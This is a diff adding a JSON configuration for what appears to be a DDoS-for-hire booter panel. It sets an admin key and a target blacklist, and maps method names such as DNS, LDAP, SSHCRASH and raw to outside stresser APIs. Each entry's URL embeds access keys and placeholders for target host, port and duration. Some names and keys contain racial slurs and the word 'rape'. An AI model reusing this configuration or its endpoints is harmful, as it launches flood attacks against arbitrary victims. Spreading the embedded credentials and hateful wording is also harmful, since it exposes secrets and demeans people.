@@ -1,0 +1,185 @@
+{
+    "apiport" : ":1337",
+    "apikey" : "vmfeEntaysAdminKey101",
+
+    "timeout" : 3,
+
+    "whitelisting" : {
+        "Whitelist" : false,
+        "Whitelists" : [
+            "127.0.0.1"
+        ]
+    },
+
+    "blacklists" : [
+        "1.1.1.1",
+        "fbi.gov",
+        "https://beta.welovecloudflare.de",
+        "117.27.239.6",
+        "117.27.239.45",
+        "23.227.144.50",
+        "78.108.216.11",
+        "5.189.170.142",
+        "207.154.222.90",
+        "198.12.225.107",
+        "162.55.44.17",
+        "135.181.45.33",
+        "2.59.134.89",
+        "45.138.72.61",
+        "135.125.160.56",
+        "94.23.177.233",
+        "135.125.188.124",
+        "139.99.181.30",
+        "137.74.65.165",
+        "149.56.5.39",
+        "51.15.1.185",
+        "188.127.239.24",
+        "185.85.196.1",
+        "195.85.201.183",
+        "178.175.130.42",
+        "179.61.251.192",
+        "5.254.40.21",
+        "108.61.192.68"
+    ],
+
+
+    "methods" : [
+        {
+            "name" : "HOME-RAPE",
+            "apis" : [
+                {
+                    "method" : "DNS",
+                    "target" : "https://shiestystress.net/api/api.php?key=fQ7fRsWGU7cfsdAK&host=[target]&port=[port]&time=[duration]&method=[method]",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "MaxTime" : 200
+        },
+        {
+                    "method" : "HOLD",
+                    "target" : "http://45.41.241.5:505/api?key=downylikesniggerdick374&host=[target]&port=[port]&time=[duration]&method=[method]",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "MaxTime" : 2000
+        },
+        {
+                    "method" : "DNS",
+                    "target" : "https://securityteamapi.io/api.php?ip=[target]&port=[port]&time=[duration]&method=[method]&vip=NO&user=TearThaGawd&key=neutronsstressSECTEAM133",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "MaxTime" : 300
+        },
+        {
+                    "method" : "STD",
+                    "target" : "http://195.58.38.10/api.php?key=Klox-LIFETIME0983312&host=[target]&port=[port]&time=[duration]&method=[method]",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "MaxTime" : 200
+        },
+        {
+                    "method" : "LDAP",
+                    "target" : "https://crusher-api.xyz/panel/api/api.php?key=eP2M0woN8VNadCaf&host=[target]&port=[port]&time=[duration]&method=[method]",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "MaxTime" : 200
+        },
+        {
+                    "method" : "LDAP",
+                    "target" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-kakiFhmRiu29umbdDrgWkePYLxYRvz&host=[target]&port=[port]&time=[duration]&method=[method]",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "MaxTime" : 200
+                }
+            ]
+        },
+        {
+            "name" : "RAPE",
+            "apis" : [
+                {
+                    "method" : "HOLD",
+                    "target" : "http://45.41.241.5:505/api?key=downylikesniggerdick374&host=[target]&port=[port]&time=[duration]&method=[method]",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "MaxTime" : 2000
+
+                }
+            ]
+        },
+        {
+            "name" : "HOME",
+            "apis" : [
+                {
+                    "method" : "HOME-RAPE",
+                    "target" : "http://149.56.35.183/?key=&host=[target]&port=[port]&time=[duration]&method=[method]",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "maxTime" : 400
+                }
+            ]
+        },
+        {
+            "name" : "SSHCRASH",
+            "apis" : [
+                {
+                    "method" : "SSHCRASH",
+                    "target" : "http://137.74.148.85/vip?user=vmfe&key=pw6sw9579z&host=[target]&port=[port]&time=[duration]&method=[method]",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "MaxTime" : 120
+                    
+                    
+                }
+            ]
+        },
+        {
+            "name" : "RAW",
+            "apis" : [
+                {
+                    "method" : "raw",
+                    "target" : "https://raw.yumeko.army/attack?user=down&pass=memum&target=[target]&port=[port]&method=[method]&time=[duration]",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "MaxTime" : 300
+                },
+                {
+                    "method" : "HOME",
+                    "target" : "https://api.cosmos.ovh/api?key=keiraisswaggy&host=[target]&port=[port]&time=[duration]&method=[method]",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "MaxTime" : 300
+                }
+            ]
+        },
+        {
+            "name" : "STDHEX",
+            "apis" : [
+                {
+                    "method" : "hex",
+                    "target" : "https://raw.yumeko.army/attack?user=down&pass=memum&target=[target]&port=[port]&method=[method]&time=[duration]",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "MaxTime" : 300
+                },
+                {
+                    "method" : "std",
+                    "target" : "https://raw.yumeko.army/attack?user=down&pass=memum&target=[target]&port=[port]&method=[method]&time=[duration]",
+                    "urlencode" : true,
+
+                    "maxTimeLimit" : true,
+                    "MaxTime" : 300
+                }
+            ]
+        }
+    ]
+}
